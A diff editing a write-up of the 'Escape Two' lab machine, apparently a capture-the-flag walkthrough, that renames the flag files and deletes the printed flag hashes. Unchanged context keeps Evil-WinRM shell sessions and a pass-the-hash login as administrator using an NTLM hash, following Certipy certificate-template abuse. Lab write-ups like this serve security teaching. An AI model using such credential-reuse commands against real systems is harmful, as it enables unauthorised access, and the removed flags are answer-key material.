@@ -1,7 +1,7 @@
 ---
 title: Escape Two
 slug: Escape-Two
-tags: [Windows, MSSQL, Shadow-Credential-Attack, Certipy, ESC-4, Vulnerability Research]
+tags: [Shadow-Credential-Attack, ESC-4, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -414,10 +414,9 @@ Info: Establishing connection to remote endpoint
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
--ar---       10/17/2025  11:20 PM             34 user.txt
+-ar---       10/17/2025  11:20 PM             34 local-proof.txt
 
-*Evil-WinRM* PS C:\Users\ryan\Desktop> cat user.txt
-725f84804a5d54641c96bce291b81f34
+*Evil-WinRM* PS C:\Users\ryan\Desktop> cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -622,8 +621,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 $ evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i 10.129.85.20
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-2a74de6b54124ea976172036ef6c0d18
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat privileged-proof.txt
 ```
 
 ---
